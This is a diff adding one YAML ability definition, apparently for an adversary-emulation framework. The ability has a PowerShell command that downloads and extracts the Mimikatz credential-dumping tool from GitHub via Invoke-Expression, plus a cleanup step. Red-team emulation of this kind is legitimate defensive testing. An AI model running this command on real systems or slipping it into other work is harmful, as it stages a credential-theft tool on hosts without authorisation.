@@ -1,0 +1,40 @@
+- additional_info: {}
+  repeatable: false
+  singleton: false
+  tactic: execution
+  name: Donwload latest version of Mimikatz
+  access: {}
+  delete_payload: true
+  buckets:
+  - execution
+  privilege: ''
+  technique_id: T1059.001
+  requirements: []
+  technique_name: 'Command and Scripting Interpreter: PowerShell'
+  plugin: ''
+  executors:
+  - uploads: []
+    parsers: []
+    code: null
+    additional_info: {}
+    cleanup:
+    - Remove-Item -Force -path "$env:PUBLIC\Toolz\mimikatz.zip"
+    platform: windows
+    name: psh
+    command: "$DestinationFile = \"$env:PUBLIC\\Toolz\\mimikatz.zip\"; \n$DownloadURL\
+      \ = \"https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip\"\
+      ; \n$exf_file = \"$env:PUBLIC\\exf\\mimi_down_extract.log\"; \n$CompleteCommand=\
+      \ \"Invoke-WebRequest\"+\" $DownloadURL\"+\" -outfile \"+\"$DestinationFile\"\
+      ; \nInvoke-Expression  \"$CompleteCommand\";\nif ([System.IO.File]::Exists(\"\
+      $DestinationFile\")) { \nExpand-Archive -LiteralPath \"$DestinationFile\" -DestinationPath\
+      \ \"$env:PUBLIC\\Toolz\" -Force; \n\"The file $DestinationFile has been downloaded\
+      \ and extracted in Toolz Directory !!!\" | Out-File -FilePath \"$exf_file\"\
+      ; \nexit 0; \n} \nelse { \n\"The file $DestinationFile does not exists !!!\"\
+      \ | Out-File -FilePath \"$exf_file\";\n exit 1; \n}; "
+    language: null
+    timeout: 60
+    variations: []
+    payloads: []
+    build_target: null
+  description: Download latest version of mimikatz from github and extracts it
+  id: download_latest_mimikatz
